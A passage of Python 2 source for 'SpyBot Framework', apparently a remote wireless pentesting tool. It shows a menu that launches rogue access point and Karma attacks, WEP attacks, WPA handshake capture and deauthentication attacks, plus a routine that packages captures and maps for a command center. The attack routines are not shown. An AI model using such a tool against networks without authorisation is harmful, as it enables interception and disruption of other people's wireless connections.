                    continue
            if rap_enc=='OPEN':
                pass
            else:
                rap_enc='WPA2'
            print "[*] Access point %s Chosen!"%(rap_name)
            create_rogue(rap_name,rap_channel,rap_enc)
        elif ch=='4':
            print "[*] Karma Mode Selected!\n[*] Select the encryption to be used: [1] OPEN [2] WPA2-Enterprise"
            while True:
                enc=click.getchar()
                if enc not in ['1','2']:
                    print "[*] Enter a valid numeric option!"
                    continue
                else:
                    if enc=='1':
                        rap_enc='OPN'
                    else: rap_enc='WPA2'
                    break
            rap_name="karma_mode_dev"
            rap_channel=6
            create_rogue(rap_name,rap_channel,rap_enc)
####END OF CHOICES####
    except KeyboardInterrupt:
        print "[*] You chose to exit! Returning to Main Menu."
        return
def prep_filetransfer():
    print "[*] Checking for 'ForAdmin' Directory" #in Spybotmain.py
    if os.path.isdir("./ForAdmin"):
        print "[*] ForAdmin Directory exists! Skipping Creation of ForAdmin!"
        print "[*] Checking for previous files.."
        if os.path.isfile("./ForAdmin/ForAdmin.zip"):
            cmd="rm ./ForAdmin/ForAdmin.zip"
            os.system(cmd)
            print "[*] Deleting previous files.."
    else:
        print "[*] ForAdmin Directory does not exist! Creating ForAdmin Directory!"
        os.mkdir("./ForAdmin")
    cmd="zip -r ForAdmin.zip Captures Maps spybot.db"
    os.system(cmd)
    cmd="cp ForAdmin.zip ./ForAdmin"
    print "[*] Captures and Maps stored in ForAdmin Directory!"
    os.system(cmd)
    cmd="rm ForAdmin.zip"
    os.system(cmd)
    cmd="chmod a+rw ./ForAdmin/ForAdmin.zip ./ForAdmin"
    os.system(cmd)
    print "[*] Files prepared for sending! Launch File Retreiver at admin.py! Press Enter"
    raw_input()

if __name__=='__main__':             ###MAIN FUNCTION
    # try:
        global connection
        connection=init_db()
        init_interface()
        os.system("clear")
        while True:
            # print """
            #
            # """
            print"""\n
                 $$$$$$\                      $$$$$$$\             $$
                $$  __$$\                     $$  __$$\            $$ |
                $$ /  \__| $$$$$$\  $$\   $$\ $$ |  $$ | $$$$$$\ $$$$$$
                \$$$$$$\  $$  __$$\ $$ |  $$ |$$$$$$$\ |$$  __$$\ _$$  _|
                 \____$$\ $$ /  $$ |$$ |  $$ |$$  __$$\ $$ /  $$ | $$ |
                $$\   $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ | $$ |$$
                \$$$$$$  |$$$$$$$  |\$$$$$$$ |$$$$$$$  |\$$$$$$  | \$$$$  |
                 \______/ $$  ____/  \____$$ |\_______/  \______/   \____/
                          $$ |      $$\   $$ |
                          $$ |      \$$$$$$  |
                          \__|       \______/


            Welcome To SpyBot Framework. A Remote Wireless Pentesting Framework.
            Select an option and follow the instruction to use!
            1. Launch Network Scanner.
            2. Launch Client Probe Scanner.
            3. Launch Hidden SSID Scanner.
            4. Launch WEP Attack.
            5. Capture WPA Handshake.
            6. Launch Deauthentication Attack.
            7. Launch Rogue AP Attacks.
            8. Send Files To Command Center.
            Press 'C to Exit'
            """
            ch=click.getchar()
            if ch=='1':
                network_scanner()
                make_map()
            elif ch=='2':
                clientprobe_scanner()
            elif ch=='3':
                hiddenap_scanner()
            elif ch=='4':
                wep_packet_capture()
            elif ch=='5':
                wpa_handshake_capture()
            elif ch=='6':
                deauth_launcher()
            elif ch=='7':
                rogue_AP_launcher()
            elif ch=='8':#check the function call in
                prep_filetransfer()
            elif ch in ['C','c']:
                reset_interface()
                connection.close()
                print "Bye!"
                sys.exit(0)
            else:
                print "[*] Please Enter a Valid Option!"

    # except:
    #     print "Exception Occured"
    #     reset_interface()
    #     connection.commit()
    #     connection.close()
    #     sys.exit(0)
